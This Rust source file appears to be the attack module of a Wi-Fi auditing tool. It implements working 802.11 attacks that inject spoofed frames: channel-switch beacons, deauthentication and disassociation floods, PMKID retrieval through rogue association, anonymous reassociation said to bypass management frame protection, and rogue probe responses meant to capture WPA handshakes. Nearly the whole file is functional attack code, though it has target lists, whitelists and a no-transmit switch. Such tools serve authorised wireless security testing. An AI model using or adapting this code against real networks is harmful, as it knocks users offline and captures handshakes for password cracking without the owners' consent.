// Attack! //

use std::{
    os::fd::AsRawFd,
    time::{Duration, SystemTime},
};

use crate::interface::Band as WiFiBand;
use libwifi::{
    frame::{
        components::{MacAddress, RsnAkmSuite, RsnCipherSuite, RsnInformation},
        Beacon, DeauthenticationReason, ProbeRequest,
    },
    Addresses,
};

use crate::{
    status::{MessageType, StatusMessage},
    tx::{
        build_association_request_rg, build_authentication_frame_noack,
        build_authentication_frame_with_params, build_csa_action, build_csa_beacon,
        build_deauthentication_fm_ap, build_deauthentication_fm_client,
        build_disassocation_from_ap, build_disassocation_from_client, build_probe_response,
        build_reassociation_request,
    },
    write_packet, OxideRuntime,
};

//////////////////////////////////////////////////////////////
//                                                          //
//             Channel Switch Announcment Attack            //
//   This form of attack will send beacon frames for the AP //
//   with the CSA Information Element in an attempt to      //
//   force clients to change to a nearby channel. This can  //
//   result in a reauthentication/association.              //
//                                                          //
//////////////////////////////////////////////////////////////

pub fn csa_attack(oxide: &mut OxideRuntime, beacon: Beacon) -> Result<(), String> {
    if oxide.config.disable_csa {
        return Ok(());
    }

    let channel = oxide.get_adjacent_channel();
    let binding = beacon.clone();
    let ap_mac = binding.header.src().unwrap();
    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
        dev
    } else {
        return Ok(());
    };

    if !oxide.target_data.targets.is_target(ap_data) {
        return Ok(());
    }

    if oxide.target_data.whitelist.is_whitelisted(ap_data) {
        return Ok(());
    }

    // If we already have a 4whs, don't continue.
    if oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
    {
        return Ok(());
    }

    if channel.is_none() {
        return Ok(());
    }

    let new_channel = 14;

    // If we are transmitting
    if !oxide.config.notx {
        // Send 5 beacons with decreasing counts
        for count in (0..6).rev() {
            let sequence = beacon.header.sequence_control.sequence_number + (6 - count as u16);
            let frx = build_csa_beacon(beacon.clone(), new_channel.into(), count, sequence);
            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Info,
                format!(
                    "CSA Attack (Beacon): {} ({}) Channel: {} | Count: {}",
                    ap_mac,
                    beacon
                        .station_info
                        .ssid
                        .clone()
                        .unwrap_or("Hidden".to_string()),
                    new_channel,
                    count
                ),
            ));
        }

        let client = MacAddress::broadcast();

        // Send a CSA action frame to broadcast
        let frx = build_csa_action(&client, &ap_data.mac_address, new_channel);
        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
        oxide.status_log.add_message(StatusMessage::new(
            MessageType::Info,
            format!(
                "CSA Attack (Action): {} => {} ({}) Channel: {}",
                ap_mac,
                client,
                beacon.station_info.ssid.unwrap_or("Hidden".to_string()),
                new_channel
            ),
        ));

        ap_data.interactions += 1;
        ap_data.auth_sequence.state = 1;
    }

    Ok(())
}

//////////////////////////////////////////////////////////////
//                                                          //
//                 Disassociation Attack                    //
//  This attack sends the AP/Client similar disassociation  //
//  frames in an attempt to force a re-authentication. This //
//  attack will only target a client of an AP and will send //
//  the disassociation to the AP and Client simultaneously. //
//                                                          //
//////////////////////////////////////////////////////////////

pub fn disassoc_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
    if oxide.config.disable_disassoc {
        return Ok(());
    }

    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
        dev
    } else {
        return Ok(());
    };

    if !oxide.target_data.targets.is_target(ap_data) {
        return Ok(());
    }

    if oxide.target_data.whitelist.is_whitelisted(ap_data) {
        return Ok(());
    }

    if oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
    {
        return Ok(());
    }

    if oxide.config.notx {
        return Ok(());
    }

    let random_client = ap_data
        .client_list
        .get_random()
        .map(|client| client.mac_address);

    if let Some(mac_address) = random_client {
        // Rate limit directed disassoc to every 32 beacons.
        let deauth_client = mac_address;
        // Deauth From AP
        let frx =
            build_disassocation_from_client(ap_mac, &deauth_client, oxide.counters.sequence1());
        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);

        if ap_data
            .channel
            .as_ref()
            .is_some_and(|f| f.0 == WiFiBand::BAND_6_GHZ)
        {
            let frx = build_disassocation_from_ap(
                ap_mac,
                &deauth_client,
                oxide.counters.sequence1(),
                DeauthenticationReason::DisassociatedDueToPoorRSSI,
            );
            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
        } else {
            let frx = build_disassocation_from_ap(
                ap_mac,
                &deauth_client,
                oxide.counters.sequence1(),
                DeauthenticationReason::DisassociatedDueToInactivity,
            );
            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
        }

        ap_data.interactions += 1;
        oxide.status_log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("Sending Disassociation: {} <=> {}", ap_mac, deauth_client),
        ));
    }

    Ok(())
}

//////////////////////////////////////////////////////////////
//                                                          //
//             M1 (PMKID) Retreival Attack                  //
//   This form of attack is two-stage process that will     //
//   attempt to elicit an AP for a PMKID by authenticating  //
//   and associating with the access point. Given the       //
//   correct parameters the AP will send an EAPOL M1 to     //
//   us, which may contain PMKID.                           //
//                                                          //
//////////////////////////////////////////////////////////////

/// M1 Retrieval Attack Phase 1
pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
    if oxide.config.disable_pmkid {
        return Ok(());
    }

    if oxide.config.notx {
        return Ok(());
    }

    // get AP object, if there isn't one, return (this shouldn't happen).
    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
        dev
    } else {
        return Ok(());
    };

    if !oxide.target_data.targets.is_target(ap_data) {
        return Ok(());
    }

    if oxide.target_data.whitelist.is_whitelisted(ap_data) {
        return Ok(());
    }

    // If we already have a 4whs, don't continue.
    if oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
    {
        return Ok(());
    }

    if ap_data.ssid.is_none() {
        return Ok(());
    }

    // If we already have an M1 for this AP, don't re-attack.
    if oxide.handshake_storage.has_m1_for_ap(ap_mac) {
        return Ok(());
    }

    // Ensure the AP uses PSK (from the robust security ie)
    if !ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
        return Ok(());
    }

    if !ap_data.auth_sequence.cts() {
        return Ok(());
    }

    // Make an authentication frame (no_ack), so we don't over-send.
    // This will flip between sending params and not sending, hopefully one of them works.
    let frx = if oxide.counters.seq2 % 2 == 0 {
        build_authentication_frame_noack(
            ap_mac,
            &oxide.target_data.rogue_client,
            oxide.counters.sequence2(),
        )
    } else {
        build_authentication_frame_with_params(
            ap_mac,
            &oxide.target_data.rogue_client,
            oxide.counters.sequence2(),
        )
    };

    // If we are transmitting
    let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
    ap_data.interactions += 1;
    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!("M1 Retrieval - Sent Authentication Req [{}]", ap_mac),
    ));

    Ok(())
}

/// This is phase two of M1 Retrieval, specifically processed after we receive an authentication from AP where the station is our rogue mac.
pub fn m1_retrieval_attack_phase_2(
    ap_mac: &MacAddress,
    client_mac: &MacAddress,
    oxide: &mut OxideRuntime,
) -> Result<(), String> {
    // Return if PMKID is disabled
    if oxide.config.disable_pmkid {
        return Ok(());
    }

    // Return if no-transmit is on
    if oxide.config.notx {
        return Ok(());
    }

    // Get our AP
    let ap_data = if let Some(ap) = oxide.access_points.get_device(ap_mac) {
        ap
    } else {
        return Ok(());
    };

    if !oxide.target_data.targets.is_target(ap_data) {
        return Ok(());
    }

    if oxide.target_data.whitelist.is_whitelisted(ap_data) {
        return Ok(());
    }

    // if we already have a PMKID, return
    if ap_data.has_pmkid {
        return Ok(());
    }

    if !ap_data.auth_sequence.cts() {
        return Ok(());
    }

    let cs = if ap_data.information.cs_tkip.is_some_and(|f| f) {
        RsnCipherSuite::TKIP
    } else {
        RsnCipherSuite::CCMP
    };

    let gs: RsnCipherSuite = if ap_data.information.gs_tkip.is_some_and(|f| f) {
        RsnCipherSuite::TKIP
    } else {
        RsnCipherSuite::CCMP
    };

    let frx: Vec<u8> = build_association_request_rg(
        ap_mac,
        client_mac,
        ap_mac,
        oxide.counters.sequence2(),
        ap_data.ssid.clone(),
        gs,
        vec![cs],
    );

    let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
    ap_data.interactions += 1;
    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!("M1 Retrieval - Sent Association Req [{}]", ap_mac),
    ));

    Ok(())
}

//////////////////////////////////////////////////////////////
//                                                          //
//                  Deauthentication Attack                 //
//  This attack sends a standard DEAUTHENTICATION frame to  //
//  try and force a Client to re-authenticate with an       //
//  access point. We do this either to broadcast (targeting //
//  all clients) or to a specific client. In the case we    //
//  target a specific client, we also send a                //
//  DEAUTHENTICATION frame to the Access Point              //
//  simultaneously.                                         //
//                                                          //
//////////////////////////////////////////////////////////////

pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
    if oxide.config.disable_deauth {
        return Ok(());
    }

    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
        dev
    } else {
        return Ok(());
    };

    if !oxide.target_data.targets.is_target(ap_data) {
        return Ok(());
    }

    if oxide.target_data.whitelist.is_whitelisted(ap_data) {
        return Ok(());
    }

    if oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
    {
        return Ok(());
    }

    if oxide.config.notx {
        return Ok(());
    }

    let beacon_count = ap_data.beacon_count;
    let mut deauth_client = MacAddress([255, 255, 255, 255, 255, 255]);

    if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp) && ap_data.information.akm_mask() {
        let random_client = ap_data
            .client_list
            .get_random()
            .map(|client| client.mac_address);

        if let Some(mac_address) = random_client {
            // Rate limit directed deauths to every 32 beacons.
            deauth_client = mac_address;
            // Deauth From AP
            let frx = build_deauthentication_fm_ap(
                ap_mac,
                &mac_address,
                oxide.counters.sequence1(),
                DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
            );
            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);

            // Deauth From Client
            let frx = build_deauthentication_fm_client(
                ap_mac,
                &mac_address,
                oxide.counters.sequence1(),
                DeauthenticationReason::DeauthenticatedBecauseSTAIsLeaving,
            );
            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);

            ap_data.interactions += 1;
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Info,
                format!("Sending Deauth: {} <=> {}", ap_mac, deauth_client),
            ));
        }
        // Rate limit broadcast deauths to every 128 beacons.
        let rate = beacon_count % (oxide.target_data.attack_rate.to_rate() * 4);
        if rate == 0 {
            // There is no client
            let frx = build_deauthentication_fm_ap(
                ap_mac,
                &MacAddress::broadcast(),
                oxide.counters.sequence1(),
                DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
            );
            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);

            ap_data.interactions += 1;
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Info,
                format!("Sending Deauth: {} => {}", ap_mac, deauth_client),
            ));
        }
    }

    Ok(())
}

//////////////////////////////////////////////////////////////
//                                                          //
//             Anonymous Reasasociation Attack              //
//   An anonmyous reassociaation attack sends an AP a       //
//  reassociation frame with a source address of broadcast. //
//  as a result, some AP's will send a deauthentication     //
//  as a response with "Station attempting reassociation is //
//  not associated" to the broadcast address, resulting in  //
//  deauthentication of all of it's clients. This bypasses  //
//  any Management Frame Protections.                       //
//                                                          //
//////////////////////////////////////////////////////////////

pub fn anon_reassociation_attack(
    oxide: &mut OxideRuntime,
    ap_mac: &MacAddress,
) -> Result<(), String> {
    if oxide.config.disable_anon {
        return Ok(());
    }

    if oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
        || oxide.config.notx
    {
        return Ok(());
    }

    let ap = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
        dev
    } else {
        return Ok(());
    };

    if !oxide.target_data.targets.is_target(ap) {
        return Ok(());
    }

    if oxide.target_data.whitelist.is_whitelisted(ap) {
        return Ok(());
    }

    let rsn = if ap
        .pr_station
        .clone()
        .is_some_and(|station| station.rsn_information.is_some())
    {
        ap.pr_station
            .clone()
            .unwrap()
            .rsn_information
            .unwrap()
            .clone()
    } else {
        let pairwise_cipher_suites = if ap.information.cs_ccmp.is_some_and(|x| x) {
            vec![RsnCipherSuite::CCMP]
        } else if ap.information.cs_tkip.is_some_and(|x| x) {
            vec![RsnCipherSuite::TKIP]
        } else {
            return Ok(());
        };

        let group_cipher_suite = if ap.information.gs_ccmp.is_some_and(|x| x) {
            RsnCipherSuite::CCMP
        } else if ap.information.gs_tkip.is_some_and(|x| x) {
            RsnCipherSuite::TKIP
        } else {
            return Ok(());
        };
        RsnInformation {
            version: 1,
            group_cipher_suite,
            pairwise_cipher_suites,
            akm_suites: vec![RsnAkmSuite::PSK],
            mfp_required: false,
            pre_auth: false,
            no_pairwise: false,
            ptksa_replay_counter: 0,
            gtksa_replay_counter: 0,
            mfp_capable: true,
            joint_multi_band_rsna: false,
            peerkey_enabled: false,
            extended_key_id: false,
            ocvc: false,
        }
    };

    // Send a (anonymous) reassociation request to the AP
    let frx = build_reassociation_request(
        ap_mac,
        &MacAddress::broadcast(),
        ap.ssid.clone(),
        oxide.counters.sequence3(),
        rsn,
    );
    let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);

    ap.interactions += 1;
    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!("Anonymous Reassociation Attack: {}", ap_mac),
    ));

    Ok(())
}

//////////////////////////////////////////////////////////////
//                                                          //
//                      ROGUE M2 ATTACKS                    //
//  Depending on which type of probe request we see (which  //
//  can be either directed or undirected) we will send a    //
//  probe response that is appropriate in order to attack   //
//  the station and possibly elicit a M2, which while this  //
//  may contain the incorrect password, it is still likely  //
//  valid and a suitable attack vector.                     //
//                                                          //
//////////////////////////////////////////////////////////////

// Our definition of "directed" is that it is sending a probe-request to a specific AP mac.
pub fn rogue_m2_attack_directed(
    oxide: &mut OxideRuntime,
    probe: ProbeRequest,
) -> Result<(), String> {
    if oxide.config.disable_roguem2 {
        return Ok(());
    }

    // make sure TX is enabled
    if oxide.config.notx {
        return Ok(());
    }

    // Grab the station from our unnasoc. clients list.
    let station = if let Some(dev) = oxide.unassoc_clients.get_device(&probe.header.address_2) {
        dev
    } else {
        return Ok(());
    };

    // Make sure we have an SSID to send
    if probe.station_info.ssid.is_none() {
        return Ok(());
    }

    let ssid = probe.station_info.ssid.unwrap();

    if station.timer_interact.elapsed().unwrap() < Duration::from_secs(3) {
        return Ok(());
    }

    // If we have an AP for this SSID, we will use as many of the same details as possible
    if let Some(ap) = oxide.access_points.get_device_by_ssid(&ssid) {
        if oxide.target_data.whitelist.is_whitelisted(ap) {
            return Ok(());
        }

        // Make sure this AP is a target and that this AP is
        if !oxide.target_data.targets.is_target(ap)
            || oxide
                .handshake_storage
                .has_complete_handshake_for_ap(&ap.mac_address)
            || oxide.config.notx
        {
            return Ok(());
        }

        let frx = build_probe_response(
            &probe.header.address_2,
            &probe.header.address_1,
            &ssid,
            oxide.counters.sequence3(),
            oxide.if_hardware.current_channel,
        );
        write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
        station.interactions += 1;
        station.timer_interact = SystemTime::now();
        oxide.status_log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("Direct Rogue AP Attack: {} ({})", station.mac_address, ssid),
        ));
    }

    Ok(())
}

// Our definition of "undirected" is that it is sending a probe-request to broadcast.
pub fn rogue_m2_attack_undirected(
    oxide: &mut OxideRuntime,
    probe: ProbeRequest,
) -> Result<(), String> {
    if oxide.config.disable_roguem2 {
        return Ok(());
    }

    // make sure TX is enabled
    if oxide.config.notx {
        return Ok(());
    }

    // Grab the station from our unnasoc. clients list.
    let station = if let Some(dev) = oxide.unassoc_clients.get_device(&probe.header.address_2) {
        dev
    } else {
        return Ok(());
    };

    // Dont over-transmit
    if station.timer_interact.elapsed().unwrap() < Duration::from_secs(3) {
        return Ok(());
    }

    if let Some(ssid) = probe.station_info.ssid {
        if !oxide.target_data.targets.is_target_ssid(&ssid) {
            return Ok(());
        }

        if let Some(ap) = oxide.access_points.get_device_by_ssid(&ssid) {
            // Make sure this AP is a target and that this AP is
            if oxide
                .handshake_storage
                .has_complete_handshake_for_ap(&ap.mac_address)
            {
                return Ok(());
            }

            if oxide.target_data.whitelist.is_whitelisted(ap) {
                return Ok(());
            }
        }

        // Do we already have a rogue-M2 from this station (for this SSID)
        if station.rogue_actions.get(&ssid).is_some_and(|f| *f) {
            return Ok(());
        }

        let frx = build_probe_response(
            &probe.header.address_2,
            &oxide.target_data.rogue_client,
            &ssid,
            oxide.counters.sequence3(),
            oxide.if_hardware.current_channel,
        );
        write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
        station.interactions += 1;
        station.timer_interact = SystemTime::now();
        oxide.status_log.add_message(StatusMessage::new(
            MessageType::Info,
            format!(
                "Indirect Rogue AP Attack: {} ({})",
                station.mac_address, ssid
            ),
        ));
    } else {
        // We don't want to nest this...
        if oxide.target_data.targets.has_ssid() {
            // Pick a random SSID from our targets and respond.
            let target = oxide.target_data.targets.get_random_ssid().unwrap();
            let ap = if let Some(ap) = oxide.access_points.get_device_by_ssid_glob(&target) {
                // Make sure this AP is a target and that this AP is
                if oxide
                    .handshake_storage
                    .has_complete_handshake_for_ap(&ap.mac_address)
                {
                    return Ok(());
                } else {
                    ap
                }
            } else {
                return Ok(());
            };

            let frx = build_probe_response(
                &probe.header.address_2,
                &oxide.target_data.rogue_client,
                &ap.ssid.clone().unwrap(),
                oxide.counters.sequence3(),
                oxide.if_hardware.current_channel,
            );
            write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;

            station.interactions += 1;
            station.timer_interact = SystemTime::now();
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Info,
                format!(
                    "Anonymous Rogue AP Attempt: {} ({})",
                    station.mac_address,
                    ap.ssid.clone().unwrap()
                ),
            ));
        }
    }

    Ok(())
}
